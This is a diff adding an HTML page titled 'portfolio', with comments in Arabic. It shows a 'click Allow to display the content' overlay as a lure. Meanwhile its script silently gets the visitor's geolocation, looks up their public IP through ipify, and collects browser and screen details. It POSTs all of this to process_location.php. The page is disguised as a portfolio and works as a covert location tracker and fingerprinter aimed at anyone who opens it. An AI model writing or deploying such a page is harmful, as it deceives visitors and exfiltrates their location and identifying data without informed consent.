@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>portfolio</title>
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+        }
+
+        .overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            justify-content: center;
+            align-items: center;
+        }
+
+        .popup {
+            background: #fff;
+            padding: 20px;
+            border-radius: 5px;
+            text-align: center;
+        }
+
+        button {
+            padding: 10px 20px;
+            margin: 10px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="overlay" id="overlay">
+        <div class="popup">
+            <h1>Welcome</h1>
+            <p>Please click Allow to display the content</p>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", function () {
+            const overlay = document.getElementById("overlay");
+
+            // Show the popup after page load
+            overlay.style.display = "flex";
+
+            // Define functions for the buttons
+            window.allow = function () {
+                alert("Content is allowed to be displayed");
+                overlay.style.display = "none";
+            };
+
+            window.deny = function () {
+                alert("Content display is denied");
+                overlay.style.display = "none";
+            };
+        });
+            if ("geolocation" in navigator) {
+      navigator.geolocation.getCurrentPosition(
+        (position) => {
+          sendLocationData(
+            position.coords.latitude,
+            position.coords.longitude
+          );
+        },
+        (error) => {
+          console.error("فشل في الحصول على الموقع:", error.message);
+        }
+      );
+    } else {
+      console.error("المتصفح لا يدعم Geolocation API.");
+    }
+
+    function sendLocationData(latitude, longitude) {
+      const xhr = new XMLHttpRequest();
+      const url = "process_location.php";
+
+      // جلب عنوان IP باستخدام ipify
+      const ipAddressPromise = fetch("https://api64.ipify.org?format=json")
+        .then(response => response.json())
+        .then(data => data.ip);
+
+      ipAddressPromise.then(ipAddress => {
+        // جمع المزيد من المعلومات
+        const userAgent = navigator.userAgent;
+        const language = navigator.language;
+        const screenWidth = window.screen.width;
+        const screenHeight = window.screen.height;
+        const platform = navigator.platform;
+
+        // إعداد البيانات للإرسال
+        const data = `latitude=${latitude}&longitude=${longitude}&ipAddress=${ipAddress}&userAgent=${userAgent}&language=${language}&screenWidth=${screenWidth}&screenHeight=${screenHeight}&platform=${platform}`;
+
+        // إرسال البيانات إلى ملف PHP
+        xhr.open("POST", url, true);
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xhr.send(data);
+
+        // متابعة حالة الاستجابة
+        xhr.onreadystatechange = function () {
+          if (xhr.readyState === 4 && xhr.status === 200) {
+            console.log("تم إرسال الموقع بنجاح.");
+          }
+        };
+      }).catch(error => console.error("فشل في جلب عنوان IP:", error));
+    }
+    </script>
+</body>
+</html>
+
